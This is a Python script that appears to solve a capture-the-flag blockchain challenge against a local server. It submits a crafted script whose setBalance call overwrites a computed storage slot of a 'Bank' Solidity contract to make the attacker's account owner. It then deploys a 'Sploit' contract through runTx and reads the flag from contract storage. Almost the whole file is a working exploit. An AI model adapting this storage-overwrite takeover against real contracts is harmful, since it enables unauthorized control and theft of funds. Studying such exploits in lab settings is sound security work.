#!/usr/bin/env python3
import json, os, sys, requests, time
from web3 import Web3
from compiler import compile_script
from chain import solc

acc = '0x544e3941EF92D6b2Da1335AFB8B203B1706bdEa9'
ROOT = os.path.dirname(os.path.abspath(__file__))

bank_source = ROOT + '/Bank.sol'
bank_output = solc(bank_source, bank_source + ':Bank')

sploit_source = ROOT + '/Sploit.sol'
sploit_output = solc(sploit_source, sploit_source + ':Sploit')

URL = 'http://localhost:9000'

def make_proof():
    return 'x'

def spawn():
    req = {'proof': make_proof()}
    resp = json.loads(requests.post(URL + '/spawn', data=json.dumps(req)).content)
    return resp['id']

def wait(id):
    while True:
        time.sleep(2)
        res = requests.get(URL + '/status/%s' % id).content
        status = json.loads(res)['status']
        if status == 'setup':
            continue
        assert status == 'live'
        return

def run_script(id, script):
    req = {'id': id, 'script': script, 'proof': make_proof()}
    resp = requests.post(URL + '/execute', data=json.dumps(req))
    return json.loads(resp.content)

def dump_script(script):
    req = {'script': script, 'debug': True}
    resp = requests.post(URL + '/execute', data=json.dumps(req))
    return json.loads(resp.content)['generated_code']

def exploit(id, bank_address):
    w3 = Web3(Web3.HTTPProvider(URL + '/eth/' + id))
    Bank = w3.eth.contract(
        abi=bank_output['abi'],
        bytecode=bank_output['bin'],
        address=bank_address)

    assert not Bank.functions.isOwner(acc).call()

    addr = Web3.soliditySha3(['uint256', 'uint256'], [int(acc, 16), 0])
    addr = int.from_bytes(addr, byteorder='big')

    script = '''
        x=100
        0
        0
        0
        0
        0
        0
        0
        0
        0
        0
        0
        0
        0
        {}
        z=0
        0
        y=z+x
        setBalance(y, 1)
        '''.format(str(addr))

    print(json.dumps({'script': script}))
    input('run it, then press ENTER')
    # print(run_script(id, script))

    assert Bank.functions.isOwner(acc).call()

    Sploit = w3.eth.contract(
        abi=sploit_output['abi'],
        bytecode=sploit_output['bin'])
    tx_hash = Sploit.constructor().transact({
        'from': acc, 'gas': 2000000})
    tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash)

    Sploit = w3.eth.contract(
        abi=Sploit.abi, address=tx_receipt.contractAddress)

    Bank.functions.runTx(Sploit.address).transact({
        'from': acc, 'gas': 2000000})

    print('Waiting for flag')
    time.sleep(10)
    flag1 = w3.eth.getStorageAt(Bank.address, 100)
    flag2 = w3.eth.getStorageAt(Bank.address, 101)
    print(flag1 + flag2)

if __name__ == '__main__':
    bank_address = '0x4836D27fC5397854Db3eEc3BefEAb299cA19338f'

    if len(sys.argv) > 1:
        if sys.argv[1] == 'DUMP':
            hsk = dump_script('''
                setBalance(42, 1337 % 1)
                ''')
            print(hsk.split('code = (')[1].split('ret ()')[0])
            exit()
        else:
            id = sys.argv[1]
    else:
        id = spawn()
        wait(id)

    exploit(id, bank_address)
